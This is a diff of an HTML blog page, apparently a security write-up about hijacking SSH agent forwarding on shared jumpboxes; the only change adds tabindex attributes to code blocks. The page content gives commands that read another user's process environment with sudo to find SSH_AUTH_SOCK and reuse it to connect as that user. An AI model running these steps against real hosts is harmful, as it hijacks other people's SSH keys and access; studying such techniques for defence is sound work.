@@ -141,7 +141,7 @@
 <h3 id="jumpboxes">Jumpboxes</h3>
 <p>The typical scenario where this is quite powerful are <code>jumpboxes</code>. One can query the SSH Agent&rsquo;s socket of others and then connect the <code>ssh</code> client to that socket, and leverage the victim&rsquo;s SSH private keys that way.</p>
 <p>Forwarding is typically done by updating the <code>ssh_config</code> file to include:</p>
-<pre><code>    ForwardAgent yes
+<pre tabindex="0"><code>    ForwardAgent yes
 </code></pre><p>Manually this can be done by using <code>ssh -A</code>.</p>
 <h3 id="ssh_auth_sock">SSH_AUTH_SOCK</h3>
 <p>What makes this all possible is the environment variable <code>SSH_AUTH_SOCK</code>.</p>
@@ -159,15 +159,15 @@
 <ol>
 <li>Find the sshd that launched the users shell (e.g. bash).</li>
 </ol>
-<pre><code>$ pstree -p sarah | grep sshd
+<pre tabindex="0"><code>$ pstree -p sarah | grep sshd
 </code></pre><ol start="2">
 <li>Take note of the PID of the bash process and fill in the PID accordingly when running:</li>
 </ol>
-<pre><code>$ sudo cat /proc/{PID}/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK 
+<pre tabindex="0"><code>$ sudo cat /proc/{PID}/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK 
 </code></pre><ol start="3">
 <li>If all works you can ssh to other machines where sarah has access to.</li>
 </ol>
-<pre><code>$ sudo SSH_AUTH_SOCK={value} ssh sarah@localhost
+<pre tabindex="0"><code>$ sudo SSH_AUTH_SOCK={value} ssh sarah@localhost
 </code></pre><p>This is a neat TTP that is especially impactful when an adversary gains access to a shared host.</p>
 <p>Greetings.</p>
 <h3 id="references">References</h3>
@@ -178,9 +178,9 @@
 <h3 id="appendix">Appendix</h3>
 <p>Just some random notes around launching ssh-agent</p>
 <p>When launching <code>ssh-agent</code> it will return the commands to the set the environment variable accordingly. This is also the reason why SSH Agent must be launched using an <code>eval</code> statement to set the <code>SSH_AUTH_SOCK</code> variable.</p>
-<pre><code>eval $(ssh-agent -s)
+<pre tabindex="0"><code>eval $(ssh-agent -s)
 </code></pre><p>If you don&rsquo;t do this, you get <code>Could not open a connection to your authentication agent.</code> as an error message when trying to list or add keys via <code>ssh-add</code>.</p>
-<pre><code>ssh-add -l
+<pre tabindex="0"><code>ssh-add -l
 The agent has no identities.
 </code></pre>
   </section>
